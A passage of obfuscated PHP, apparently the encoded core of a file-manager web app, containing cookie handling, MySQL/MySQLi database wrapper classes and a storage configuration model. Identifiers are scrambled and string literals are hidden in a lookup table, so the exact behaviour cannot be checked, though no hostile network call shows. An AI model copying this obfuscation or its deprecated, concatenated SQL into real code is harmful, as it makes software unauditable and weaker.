url_request($Ì‚¶ŠÄ, $¡‚§˜™ß[1494], !1, $Õ›¬, !1, !1, 30); return $ÏŞûì™[$¡‚§˜™ß[1284]] ? $ÏŞûì™[$¡‚§˜™ß[1284]] : $¡‚§˜™ß[12]; } public function download($­åË‘ƒû, $ç­úÑéú) { Downloader::start($­åË‘ƒû, $ç­úÑéú); return $ç­úÑéú; } } goto CòÉ¶ê±ìµ; F°ó¯àß³: class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($’±ŠŞŒ× = '', $©ÓƒëÏ = 0) { if (is_string($’±ŠŞŒ×) && $’±ŠŞŒ× != $_SERVER[Š—Â“œÔ][12]) { $this->prefix = $’±ŠŞŒ×; } if (is_numeric($©ÓƒëÏ) && $©ÓƒëÏ > 0) { $this->expire = $©ÓƒëÏ; } } public static function getInstance() { static $Éâ»ˆÎ¾; if ($Éâ»ˆÎ¾ === null) { $Éâ»ˆÎ¾ = new self(); } return $Éâ»ˆÎ¾; } private static $cookieDisable = false; public static function disable($öòòª¯ù) { self::$cookieDisable = $öòòª¯ù; } private static $sameCookieSet = array(); public static function set($¿Çßˆš¼, $å”¶è…, $şÜ’ÁÊ¼ = 0, $Õ¡­ìÛí = false, $‚²ôïÂÇ = false) { $¢–­»À =& $_SERVER[Š—Â“œÔ]; if (self::$cookieDisable) { return; } if (!$şÜ’ÁÊ¼) { $şÜ’ÁÊ¼ = 24 * 3600 * 7; } if (isset(self::$sameCookieSet[$¿Çßˆš¼]) && self::$sameCookieSet[$¿Çßˆš¼] == $å”¶è… . $şÜ’ÁÊ¼) { return; } self::$sameCookieSet[$¿Çßˆš¼] = $å”¶è… . $şÜ’ÁÊ¼; if (!$‚²ôïÂÇ) { $‚²ôïÂÇ = str_replace(HOST, $¢–­»À[12], APP_HOST); $‚²ôïÂÇ = _get($GLOBALS, $¢–­»À[957], $‚²ôïÂÇ); } $¤†‰Ñğ€ = $¢–­»À[12]; setcookie($¿Çßˆš¼, $å”¶è…, time() + $şÜ’ÁÊ¼, $¢–­»À[8] . trim($‚²ôïÂÇ, $¢–­»À[8]) . $¤†‰Ñğ€, !1, !1, $Õ¡­ìÛí); } public static function setSafe($À©·ôÏÍ, $õ€Ò¢«¦, $ÛŒâµ†Õ = 0) { self::set($À©·ôÏÍ, $õ€Ò¢«¦, $ÛŒâµ†Õ, !0); } public static function get($×Î°•úó) { static $ ÎÓÌÂ  = false; if (!$ ÎÓÌÂ ) { self::initHeaderCookie(); $ ÎÓÌÂ  = !0; } return isset($_COOKIE[$×Î°•úó]) ? $_COOKIE[$×Î°•úó] : !1; } private static function initHeaderCookie() { $ÛáæÛÈ¾ =& $_SERVER[Š—Â“œÔ]; if (!isset($_SERVER[$ÛáæÛÈ¾[958]]) || !$_SERVER[$ÛáæÛÈ¾[958]]) { return; } $ğØÇ‹ş = explode($ÛáæÛÈ¾[74], $_SERVER[$ÛáæÛÈ¾[958]]); foreach ($ğØÇ‹ş as $ÜÔô›˜Î) { $ÜÔô›˜Î = explode($ÛáæÛÈ¾[508], $ÜÔô›˜Î); if (count($ÜÔô›˜Î) != 2 || !isset($ÜÔô›˜Î[1])) { continue; } $_COOKIE[trim($ÜÔô›˜Î[0])] = trim($ÜÔô›˜Î[1]); } } public static function remove($µ°„¯´ş, $“·Íš°å = false) { unset($_COOKIE[$µ°„¯´ş]); self::set($µ°„¯´ş, $_SERVER[Š—Â“œÔ][12], 1, $“·Íš°å); } } class DbMysql extends Db { public function __construct($½¦Â¬Æ¡ = '') { $£áŠÃâŒ =& $_SERVER[Š—Â“œÔ]; if (!extension_loaded($£áŠÃâŒ[872])) { think_exception(think_lang($£áŠÃâŒ[14]) . $£áŠÃâŒ[959]); } if (!empty($½¦Â¬Æ¡)) { $this->config = $½¦Â¬Æ¡; if (empty($this->config[$£áŠÃâŒ[17]])) { $this->config[$£áŠÃâŒ[17]] = $£áŠÃâŒ[12]; } } } public function connect($Í»ŸÉı = '', $ö‹í¢ûÑ = 0, $šø†óÓ… = false) { $µº¢¨Ş³ =& $_SERVER[Š—Â“œÔ]; if (!isset($this->linkID[$ö‹í¢ûÑ])) { if (empty($Í»ŸÉı)) { $Í»ŸÉı = $this->config; } $ºşµ· = $Í»ŸÉı[$µº¢¨Ş³[960]] . ($Í»ŸÉı[$µº¢¨Ş³[961]] ? "\x3a{$Í»ŸÉı[$µº¢¨Ş³[961]]}" : $µº¢¨Ş³[12]); $ºÓıËûº = !empty($Í»ŸÉı[$µº¢¨Ş³[17]][$µº¢¨Ş³[18]]) ? $Í»ŸÉı[$µº¢¨Ş³[17]][$µº¢¨Ş³[18]] : $this->pconnect; if ($ºÓıËûº) { $this->linkID[$ö‹í¢ûÑ] = mysql_pconnect($ºşµ·, $Í»ŸÉı[$µº¢¨Ş³[962]], $Í»ŸÉı[$µº¢¨Ş³[963]], 131072); } else { $this->linkID[$ö‹í¢ûÑ] = mysql_connect($ºşµ·, $Í»ŸÉı[$µº¢¨Ş³[962]], $Í»ŸÉı[$µº¢¨Ş³[963]], !0, 131072); } if (!$this->linkID[$ö‹í¢ûÑ] || !empty($Í»ŸÉı[$µº¢¨Ş³[21]]) && !mysql_select_db($Í»ŸÉı[$µº¢¨Ş³[21]], $this->linkID[$ö‹í¢ûÑ])) { think_exception(mysql_error()); } $ ÒÜ®Ø = mysql_get_server_info($this->linkID[$ö‹í¢ûÑ]); mysql_query($µº¢¨Ş³[964] . think_config($µº¢¨Ş³[965]) . $µº¢¨Ş³[58], $this->linkID[$ö‹í¢ûÑ]); if ($ ÒÜ®Ø > $µº¢¨Ş³[966]) { mysql_query($µº¢¨Ş³[967], $this->linkID[$ö‹í¢ûÑ]); } $this->connected = !0; if (1 != think_config($µº¢¨Ş³[22])) { unset($this->config); } } return $this->linkID[$ö‹í¢ûÑ]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($Õ¼ ”¬„) { $©ŒÉÒ‚¯ =& $_SERVER[Š—Â“œÔ]; if (0 === stripos($Õ¼ ”¬„, $©ŒÉÒ‚¯[343])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $Õ¼ ”¬„; if ($this->queryID) { $this->free(); } think_action_status($©ŒÉÒ‚¯[23], 1); think_status($©ŒÉÒ‚¯[24]); $this->queryID = mysql_query($Õ¼ ”¬„, $this->_linkID); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } } public function execute($ÊÏãàø¶) { $–«ÁÜ¤® =& $_SERVER[Š—Â“œÔ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $ÊÏãàø¶; if ($this->queryID) { $this->free(); } think_action_status($–«ÁÜ¤®[25], 1); think_status($–«ÁÜ¤®[24]); $‚ëÁ€ƒÅ = mysql_query($ÊÏãàø¶, $this->_linkID); $this->debug(); if (!1 === $‚ëÁ€ƒÅ) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[Š—Â“œÔ][968], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $½ª×ßØ = mysql_query($_SERVER[Š—Â“œÔ][969], $this->_linkID); $this->transTimes = 0; if (!$½ª×ßØ) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $ÍõôĞ€» = mysql_query($_SERVER[Š—Â“œÔ][970], $this->_linkID); $this->transTimes = 0; if (!$ÍõôĞ€») { $this->error(); return !1; } } return !0; } private function getAll() { $«Æ´üÀ¨ = array(); if ($this->numRows > 0) { while ($ÚÇô£°ö = mysql_fetch_assoc($this->queryID)) { $«Æ´üÀ¨[] = $ÚÇô£°ö; } mysql_data_seek($this->queryID, 0); } return $«Æ´üÀ¨; } public function getFields($ô¢©îé ) { $ŸÎ…£“¡ =& $_SERVER[Š—Â“œÔ]; $İ”Í­ÚÒ = $this->query($ŸÎ…£“¡[971] . $this->parseKey($ô¢©îé )); $Õ®áİÛÇ = array(); if ($İ”Í­ÚÒ) { foreach ($İ”Í­ÚÒ as $Õâ„“®† => $Ôñ©Ğœ·) { $Õ®áİÛÇ[$Ôñ©Ğœ·[$ŸÎ…£“¡[31]]] = array($ŸÎ…£“¡[32] => $Ôñ©Ğœ·[$ŸÎ…£“¡[31]], $ŸÎ…£“¡[33] => $Ôñ©Ğœ·[$ŸÎ…£“¡[34]], $ŸÎ…£“¡[35] => (bool) (strtoupper($Ôñ©Ğœ·[$ŸÎ…£“¡[36]]) === $ŸÎ…£“¡[972]), $ŸÎ…£“¡[37] => $Ôñ©Ğœ·[$ŸÎ…£“¡[38]], $ŸÎ…£“¡[39] => strtolower($Ôñ©Ğœ·[$ŸÎ…£“¡[40]]) == $ŸÎ…£“¡[41], $ŸÎ…£“¡[42] => strtolower($Ôñ©Ğœ·[$ŸÎ…£“¡[43]]) == $ŸÎ…£“¡[44]); } } return $Õ®áİÛÇ; } public function getTables($ñß¸ÊüÆ = '') { $ññ­é’ =& $_SERVER[Š—Â“œÔ]; if (!empty($ñß¸ÊüÆ)) { $À×åÉâ— = $ññ­é’[973] . $ñß¸ÊüÆ . $ññ­é’[974]; } else { $À×åÉâ— = $ññ­é’[975]; } $ûí‚‚¯Í = $this->query($À×åÉâ—); $ª€øº§÷ = array(); foreach ($ûí‚‚¯Í as $²ø»İ°¡ => $£‡¶´‡ø) { $ª€øº§÷[$²ø»İ°¡] = current($£‡¶´‡ø); } return $ª€øº§÷; } public function replace($Å³¨ÅìÆ, $ùÊæ‹é½ = array()) { $¥Ùè¶ˆ‚ =& $_SERVER[Š—Â“œÔ]; foreach ($Å³¨ÅìÆ as $›âå¸¼ => $Á­Åô€ï) { $Ë£êµ”ò = $this->parseValue($Á­Åô€ï); if (is_scalar($Ë£êµ”ò)) { $Ÿ­„¶Ê¨[] = $Ë£êµ”ò; $ŒúüœŒ­[] = $this->parseKey($›âå¸¼); } } $ƒà»Ú­¨ = $¥Ùè¶ˆ‚[976] . $this->parseTable($ùÊæ‹é½[$¥Ùè¶ˆ‚[358]]) . $¥Ùè¶ˆ‚[977] . implode($¥Ùè¶ˆ‚[50], $ŒúüœŒ­) . $¥Ùè¶ˆ‚[978] . implode($¥Ùè¶ˆ‚[50], $Ÿ­„¶Ê¨) . $¥Ùè¶ˆ‚[979]; return $this->execute($ƒà»Ú­¨); } public function insertAll($®ŒÄ½ùÅ, $¿Ä¼ú½œ = array(), $åüåî = false) { $¾¶ÊŸ =& $_SERVER[Š—Â“œÔ]; if (!is_array($®ŒÄ½ùÅ[0])) { return !1; } $ÛÄ¡İñÕ = array_keys($®ŒÄ½ùÅ[0]); $É˜ş÷ëÍ = array(); foreach ($®ŒÄ½ùÅ as $îˆ½²îÕ) { $ÁŒ¿…Ñ¯ = array(); foreach ($îˆ½²îÕ as $ëÀòÛÙø => $Ú‡”¿™…) { $Ú‡”¿™… = $this->parseValue($Ú‡”¿™…); if (is_scalar($Ú‡”¿™…)) { $ÁŒ¿…Ñ¯[] = $Ú‡”¿™…; } } $É˜ş÷ëÍ[] = $¾¶ÊŸ[339] . implode($¾¶ÊŸ[50], $ÁŒ¿…Ñ¯) . $¾¶ÊŸ[979]; } array_walk($ÛÄ¡İñÕ, array($this, $¾¶ÊŸ[980])); $ÁæÜ“ = ($åüåî ? $¾¶ÊŸ[981] : $¾¶ÊŸ[982]) . $¾¶ÊŸ[983] . $this->parseTable($¿Ä¼ú½œ[$¾¶ÊŸ[358]]) . $¾¶ÊŸ[977] . implode($¾¶ÊŸ[50], $ÛÄ¡İñÕ) . $¾¶ÊŸ[984] . implode($¾¶ÊŸ[50], $É˜ş÷ëÍ); return $this->execute($ÁæÜ“); } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $½ïÓ™Á =& $_SERVER[Š—Â“œÔ]; $this->error = mysql_errno() . $½ïÓ™Á[4] . mysql_error($this->_linkID); if ($½ïÓ™Á[12] != $this->queryStr) { $this->error .= LNG($½ïÓ™Á[48]) . $this->queryStr; } think_trace($this->error, $½ïÓ™Á[12], $½ïÓ™Á[49]); return $this->error; } public function escapeString($˜†‡‘Ş™) { if ($this->_linkID) { return mysql_real_escape_string($˜†‡‘Ş™, $this->_linkID); } else { return mysql_escape_string($˜†‡‘Ş™); } } public function parseKey(&$¬Å¹´½, $¼åûû· = true) { $¬Í®¡àÚ =& $_SERVER[Š—Â“œÔ]; if ($¼åûû·) { $¬Å¹´½ = $this->parseKeyCheck($¬Å¹´½); } if ($¬Å¹´½ != $¬Í®¡àÚ[222] && !preg_match($¬Í®¡àÚ[985], $¬Å¹´½)) { $¬Å¹´½ = $¬Í®¡àÚ[463] . trim($¬Å¹´½, $¬Í®¡àÚ[463]) . $¬Í®¡àÚ[463]; } return $¬Å¹´½; } } class DbMysqli extends Db { public function __construct($Öô¦ÔÖØ = '') { $Î«úÆ´² =& $_SERVER[Š—Â“œÔ]; if (!extension_loaded($Î«úÆ´²[986])) { think_exception(think_lang($Î«úÆ´²[14]) . $Î«úÆ´²[987]); } if (!empty($Öô¦ÔÖØ)) { $this->config = $Öô¦ÔÖØ; if (empty($this->config[$Î«úÆ´²[17]])) { $this->config[$Î«úÆ´²[17]] = $Î«úÆ´²[12]; } } } public function connect($Öœ»‘»­ = '', $«¼ôÎ±¨ = 0) { $áìµ¸£© =& $_SERVER[Š—Â“œÔ]; if (!isset($this->linkID[$«¼ôÎ±¨])) { if (empty($Öœ»‘»­)) { $Öœ»‘»­ = $this->config; } $this->linkID[$«¼ôÎ±¨] = new mysqli($Öœ»‘»­[$áìµ¸£©[960]], $Öœ»‘»­[$áìµ¸£©[962]], $Öœ»‘»­[$áìµ¸£©[963]], $Öœ»‘»­[$áìµ¸£©[21]], $Öœ»‘»­[$áìµ¸£©[961]] ? intval($Öœ»‘»­[$áìµ¸£©[961]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } $‘Äãì¯– = $this->linkID[$«¼ôÎ±¨]->server_version; $this->linkID[$«¼ôÎ±¨]->query($áìµ¸£©[964] . think_config($áìµ¸£©[965]) . $áìµ¸£©[58]); if ($‘Äãì¯– > $áìµ¸£©[966]) { $this->linkID[$«¼ôÎ±¨]->query($áìµ¸£©[967]); } $this->connected = !0; if (1 != think_config($áìµ¸£©[22])) { unset($this->config); } } return $this->linkID[$«¼ôÎ±¨]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($ë¸±„Ø) { $Ê—–ËÎÃ =& $_SERVER[Š—Â“œÔ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $ë¸±„Ø; if ($this->queryID) { $this->free(); } think_action_status($Ê—–ËÎÃ[23], 1); think_status($Ê—–ËÎÃ[24]); $this->queryID = $this->_linkID->query($ë¸±„Ø); if ($this->_linkID->more_results()) { while (($·“×ßöİ = $this->_linkID->next_result()) != NULL) { $·“×ßöİ->free_result(); } } $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } } public function execute($È‰ïÂ§) { $£œ±†é =& $_SERVER[Š—Â“œÔ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $È‰ïÂ§; if ($this->queryID) { $this->free(); } think_action_status($£œ±†é[25], 1); think_status($£œ±†é[24]); $ÄºÛÉú = $this->_linkID->query($È‰ïÂ§); $this->debug(); if (!1 === $ÄºÛÉú) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ó–«·™ô = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$ó–«·™ô) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $ïÄ«Õ¥Å = $this->_linkID->rollback(); $this->transTimes = 0; if (!$ïÄ«Õ¥Å) { $this->error(); return !1; } } return !0; } private function getAll() { $ÚËÊ¹÷˜ = array(); if ($this->numRows > 0) { for ($İì›­†æ = 0; $İì›­†æ < $this->numRows; $İì›­†æ++) { $ÚËÊ¹÷˜[$İì›­†æ] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $ÚËÊ¹÷˜; } public function getFields($É­àì³) { $›ñ‘Ô‹ë =& $_SERVER[Š—Â“œÔ]; $¥³²ªò = $this->query($›ñ‘Ô‹ë[971] . $this->parseKey($É­àì³)); $àô¦İÍ¿ = array(); if ($¥³²ªò) { foreach ($¥³²ªò as $Å÷äş•Š => $ÊÛ×é´) { $àô¦İÍ¿[$ÊÛ×é´[$›ñ‘Ô‹ë[31]]] = array($›ñ‘Ô‹ë[32] => $ÊÛ×é´[$›ñ‘Ô‹ë[31]], $›ñ‘Ô‹ë[33] => $ÊÛ×é´[$›ñ‘Ô‹ë[34]], $›ñ‘Ô‹ë[35] => (bool) ($ÊÛ×é´[$›ñ‘Ô‹ë[36]] === $›ñ‘Ô‹ë[12]), $›ñ‘Ô‹ë[37] => $ÊÛ×é´[$›ñ‘Ô‹ë[38]], $›ñ‘Ô‹ë[39] => strtolower($ÊÛ×é´[$›ñ‘Ô‹ë[40]]) == $›ñ‘Ô‹ë[41], $›ñ‘Ô‹ë[42] => strtolower($ÊÛ×é´[$›ñ‘Ô‹ë[43]]) == $›ñ‘Ô‹ë[44]); } } return $àô¦İÍ¿; } public function getTables($­¢ÊÒ„ = '') { $è¤ÅÄâã =& $_SERVER[Š—Â“œÔ]; $§‚ò•™ª = !empty($­¢ÊÒ„) ? $è¤ÅÄâã[973] . $­¢ÊÒ„ . $è¤ÅÄâã[974] : $è¤ÅÄâã[975]; $‹ÁÚñÖÒ = $this->query($§‚ò•™ª); $Şâæª´ = array(); if ($‹ÁÚñÖÒ) { foreach ($‹ÁÚñÖÒ as $˜³í¢ÜÊ => $ğ†ƒûµ‹) { $Şâæª´[$˜³í¢ÜÊ] = current($ğ†ƒûµ‹); } } return $Şâæª´; } public function replace($ûÜÑÈˆù, $ÒŸ”·ì¼ = array()) { $é“ñ©¿ =& $_SERVER[Š—Â“œÔ]; foreach ($ûÜÑÈˆù as $ú™÷Íë• => $İµ—Ú‚Û) { $©ÁÙ±  = $this->parseValue($İµ—Ú‚Û); if (is_scalar($©ÁÙ± )) { $äÉÌêÃû[] = $©ÁÙ± ; $‘Û»Ø“ä[] = $this->parseKey($ú™÷Íë•); } } $Šİ–Œš­ = $é“ñ©¿[976] . $this->parseTable($ÒŸ”·ì¼[$é“ñ©¿[358]]) . $é“ñ©¿[977] . implode($é“ñ©¿[50], $‘Û»Ø“ä) . $é“ñ©¿[978] . implode($é“ñ©¿[50], $äÉÌêÃû) . $é“ñ©¿[979]; return $this->execute($Šİ–Œš­); } public function insertAll($½ş–­éÛ, $Üú¢¶Ôß = array(), $¥¹û¬‡ = false) { $Èã…òµ =& $_SERVER[Š—Â“œÔ]; if (!is_array($½ş–­éÛ[0])) { return !1; } $ÃÃÛ¨ = array_keys($½ş–­éÛ[0]); $à´ƒ€Ïï = array(); foreach ($½ş–­éÛ as $²Åî¥³†) { $·¿ÕÓü× = array(); foreach ($²Åî¥³† as $³ÙŞ†¡ã => $õşô®ÑÁ) { $õşô®ÑÁ = $this->parseValue($õşô®ÑÁ); if (is_scalar($õşô®ÑÁ)) { $·¿ÕÓü×[] = $õşô®ÑÁ; } } $à´ƒ€Ïï[] = $Èã…òµ[339] . implode($Èã…òµ[50], $·¿ÕÓü×) . $Èã…òµ[979]; } array_walk($ÃÃÛ¨, array($this, $Èã…òµ[980])); $øœŸÅÓõ = $¥¹û¬‡ ? $Èã…òµ[981] : $Èã…òµ[982]; $“Õ…ª¬‚ = $øœŸÅÓõ . $Èã…òµ[983] . $this->parseTable($Üú¢¶Ôß[$Èã…òµ[358]]) . $Èã…òµ[977] . implode($Èã…òµ[50], $ÃÃÛ¨) . $Èã…òµ[984] . implode($Èã…òµ[50], $à´ƒ€Ïï); return $this->execute($“Õ…ª¬‚); } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $‚£’ã =& $_SERVER[Š—Â“œÔ]; $this->error = $this->_linkID->errno . $‚£’ã[4] . $this->_linkID->error; if ($‚£’ã[12] != $this->queryStr) { $this->error .= LNG($‚£’ã[48]) . $this->queryStr; } think_trace($this->error, $‚£’ã[12], $‚£’ã[49]); return $this->error; } public function escapeString($ù°Í‰°) { if ($this->_linkID) { return $this->_linkID->real_escape_string($ù°Í‰°); } else { return addslashes($ù°Í‰°); } } public function parseKey(&$Ÿ»ñÅ½¤, $–ù”µ¡ = true) { $ß§á¢½ =& $_SERVER[Š—Â“œÔ]; if ($–ù”µ¡) { $Ÿ»ñÅ½¤ = $this->parseKeyCheck($Ÿ»ñÅ½¤); } if ($Ÿ»ñÅ½¤ != $ß§á¢½[222] && !preg_match($ß§á¢½[985], $Ÿ»ñÅ½¤)) { $Ÿ»ñÅ½¤ = $ß§á¢½[463] . trim($Ÿ»ñÅ½¤, $ß§á¢½[463]) . $ß§á¢½[463]; } return $Ÿ»ñÅ½¤; } } goto aÚøÉ¡¡Áƒ; CãøáëĞ²: class StorageModel extends ModelBaseLight { public $optionType = "\123\x79\163\x74\x65\155\x2e\x73\x74\x6f\162\x61\147\145\x4c\x69\x73\164"; public $field = array("\x6e\x61\155\x65", "\163\x69\172\x65\115\x61\x78", "\x73\x79\163\164\145\155", "\x64\x65\146\x61\x75\x6c\164", "\x64\162\x69\166\145\x72", "\143\x6f\x6e\x66\151\147"); public function listData($ØÇ ·Ìˆ = false, $´ôâ³¦» = "\x6d\157\x64\x69\146\171\124\x69\155\x65", $ÒşêĞ‹ = false) { $Ô¹É³ş“ =& $_SERVER[Š—Â“œÔ]; $å±×Çöı = parent::listData($ØÇ ·Ìˆ, $´ôâ³¦», $ÒşêĞ‹); if ($ØÇ ·Ìˆ) { return $å±×Çöı; } $ííŞöÍ† = array(); if ($GLOBALS[$Ô¹É³ş“[2304]]) { $ííŞöÍ† = $this->ioSizeUseGet(array_to_keyvalue($å±×Çöı, $Ô¹É³ş“[12], $Ô¹É³ş“[477])); } foreach ($å±×Çöı as $ú¬¸±¨¼ => $œƒüŒ¤ä) { unset($å±×Çöı[$ú¬¸±¨¼][$Ô¹É³ş“[6]]); $å±×Çöı[$ú¬¸±¨¼][$Ô¹É³ş“[1959]] = isset($ííŞöÍ†[$œƒüŒ¤ä[$Ô¹É³ş“[477]]]) ? $ííŞöÍ†[$œƒüŒ¤ä[$Ô¹É³ş“[477]]] : 0; } return $å±×Çöı; } public function ioSizeUseGet($½€Îûœ) { $ù¶Ÿì›õ =& $_SERVER[Š—Â“œÔ]; if (!$½€Îûœ) { return array(); } $†ÒàØäñ = $ù¶Ÿì›õ[2305] . implode($ù¶Ÿì›õ[50], $½€Îûœ); $á×Ô¼« = Cache::get($†ÒàØäñ); if ($á×Ô¼«) { return $á×Ô¼«; } $ìê§Ãšß = array($ù¶Ÿì›õ[885] => $ù¶Ÿì›õ[477], $ù¶Ÿì›õ[2306] => $ù¶Ÿì›õ[79]); $ÛŒú‡¥º = array($ù¶Ÿì›õ[885] => array($ù¶Ÿì›õ[7], $½€Îûœ)); $á×Ô¼« = Model($ù¶Ÿì›õ[857])->field($ìê§Ãšß)->where($ÛŒú‡¥º)->group($ù¶Ÿì›õ[885])->select(); $á×Ô¼« = array_to_keyvalue($á×Ô¼«, $ù¶Ÿì›õ[477], $ù¶Ÿì›õ[79]); Cache::set($†ÒàØäñ, $á×Ô¼«, 600); return $á×Ô¼«; } public function getConfig($áª¬Ëò¤) { $õ®…Şƒ— = parent::listData($áª¬Ëò¤); $˜×ãã•Æ = _get($õ®…Şƒ—, $_SERVER[Š—Â“œÔ][6], array()); if ($˜×ãã•Æ && !is_array($˜×ãã•Æ)) { $˜×ãã•Æ = json_decode($˜×ãã•Æ, !0); } return $˜×ãã•Æ; } public function update($©ª¯Š²ª, $ö·µ‹­) { $ªıí‘‚ =& $_SERVER[Š—Â“œÔ]; $“¸š¿¬¨ = $ö·µ‹­[$ªıí‘‚[32]]; $†ı¬öó‡ = array_to_keyvalue(parent::listData(), $ªıí‘‚[32]); if (isset($†ı¬öó‡[$“¸š¿¬¨]) && $†ı¬öó‡[$“¸š¿¬¨][$ªıí‘‚[477]] != $©ª¯Š²ª) { return !1; } $this->checkPwd($©ª¯Š²ª, $ö·µ‹­); if (isset($ö·µ‹­[$ªıí‘‚[2307]]) && $ö·µ‹­[$ªıí‘‚[2307]] == $ªıí‘‚[91]) { $this->checkConfig($ö·µ‹­); } unset($ö·µ‹­[$ªıí‘‚[2307]]); $Õëæ®òù = parent::update($©ª¯Š²ª, $ö·µ‹­); if ($Õëæ®òù && $ö·µ‹­[$ªıí‘‚[37]]) { $ıõåƒ‰ = 0; foreach ($†ı¬öó‡ as $€¤¯§¶) { if ($€¤¯§¶[$ªıí‘‚[37]] && $€¤¯§¶[$ªıí‘‚[477]] != $©ª¯Š²ª) { $ıõåƒ‰ = $€¤¯§¶[$ªıí‘‚[477]]; parent::update($€¤¯§¶[$ªıí‘‚[477]], array($ªıí‘‚[37] => 0)); } } $this->updateBackup($©ª¯Š²ª, $ıõåƒ‰); } return $Õëæ®òù; } public function add($¨éôú¦) { $Ö—áÛ¥è =& $_SERVER[Š—Â“œÔ]; $³€–îˆ = array_to_keyvalue(parent::listData(), $Ö—áÛ¥è[32]); if (isset($³€–îˆ[$¨éôú¦[$Ö—áÛ¥è[32]]])) { return !1; } $this->checkConfig($¨éôú¦); $àÓ†— = parent::insert($¨éôú¦); if ($àÓ†— && $¨éôú¦[$Ö—áÛ¥è[37]]) { foreach ($³€–îˆ as $Î»£§ƒâ) { if ($Î»£§ƒâ[$Ö—áÛ¥è[37]]) { parent::update($Î»£§ƒâ[$Ö—áÛ¥è[477]], array($Ö—áÛ¥è[37] => 0)); } } } return $àÓ†—; } public function updateBackup($æ•Ê¸³ì, $¶®ãÚã›) { $‘—¯ÅÇ½ =& $_SERVER[Š—Â“œÔ]; if (!$¶®ãÚã›) { return; } $İÔÍò‹ = Model($‘—¯ÅÇ½[815])->config(); if ($İÔÍò‹[$‘—¯ÅÇ½[1739]] != $‘—¯ÅÇ½[91] || $İÔÍò‹[$‘—¯ÅÇ½[819]] != $¶®ãÚã›) { return; } $úÂ‹ŞœÑ = Model($‘—¯ÅÇ½[837])->get($‘—¯ÅÇ½[851]); $úÂ‹ŞœÑ = json_decode($úÂ‹ŞœÑ, !0); if (!$úÂ‹ŞœÑ) { return; } $úÂ‹ŞœÑ[$‘—¯ÅÇ½[819]] = $æ•Ê¸³ì; Model($‘—¯ÅÇ½[837])->set(array($‘—¯ÅÇ½[851] => $úÂ‹ŞœÑ)); } public function checkPwd($ïßˆè…İ, &$ÆúÁ‚óæ) { $Êû²í¥¥ =& $_SERVER[Š—Â“œÔ]; if (empty($ÆúÁ‚óæ[$Êû²í¥¥[6]])) { return; } $ ™àŞŠ = $ÆúÁ‚óæ[$Êû²í¥¥[6]]; if (!is_array($ ™àŞŠ)) { $ ™àŞŠ = json_decode($ ™àŞŠ, !0); } $Šïº€³› = $Êû²í¥¥[12]; $ÔÔ‡–Ş¬ = array($Êû²í¥¥[2308], $Êû²í¥¥[2309], $Êû²í¥¥[963]); foreach ($ÔÔ‡–Ş¬ as $çŠ¼ş¬ø) { if (isset($ ™àŞŠ[$çŠ¼ş¬ø])) { $Šïº€³› = $çŠ¼ş¬ø; break; } } if (!$Šïº€³›) { return; } $¿İ°êöó = $this->getConfig($ïßˆè…İ); $µÕÖ®×Ô = $¿İ°êöó[$Šïº€³›]; $ĞµÃØò¹ = $ ™àŞŠ[$Šïº€³›]; if ($ĞµÃØò¹ == str_repeat($Êû²í¥¥[222], strlen($µÕÖ®×Ô))) { $ ™àŞŠ[$Šïº€³›] = $µÕÖ®×Ô; $ÆúÁ‚óæ[$Êû²í¥¥[6]] = json_encode($ ™àŞŠ); } else { if ($ĞµÃØò¹ != $µÕÖ®×Ô) { $ÆúÁ‚óæ[$Êû²í¥¥[2307]] = $Êû²í¥¥[91]; } } } public function checkConfig(&$Ú¸Üåù, $‘ÑÕß¡± = false) { $¬—Âû€Ò =& $_SERVER[Š—Â“œÔ]; $¿™ôš‚è = strtolower($Ú¸Üåù[$¬—Âû€Ò[98]]); $×æ‚ç« = $Ú¸Üåù[$¬—Âû€Ò[6]]; if (!is_array($×æ‚ç«)) { $×æ‚ç« = json_decode($×æ‚ç«, !0); } foreach ($×æ‚ç« as $¹œçş§ => $ËùîÉ÷ø) { if (is_string($ËùîÉ÷ø)) { $×æ‚ç«[$¹œçş§] = trim($ËùîÉ÷ø); } } $×æ‚ç«[$¬—Âû€Ò[2310]] = rand_string(6); $ÊÍÌ¨‡ = $GLOBALS[$¬—Âû€Ò[6]][$¬—Âû€Ò[92]][$¬—Âû€Ò[893]]; $ì—Œ…Úò = isset($ÊÍÌ¨‡[$¿™ôš‚è]) ? $ÊÍÌ¨‡[$¿™ôš‚è] : ucfirst($¿™ôš‚è); $‡ëÂ‡ùª = $¬—Âû€Ò[77] . $ì—Œ…Úò; if (!$ì—Œ…Úò || !class_exists($‡ëÂ‡ùª)) { if ($‘ÑÕß¡±) { return LNG($¬—Âû€Ò[2311]); } write_log(array($¬—Âû€Ò[2312], $Ú¸Üåù, get_caller_info()), 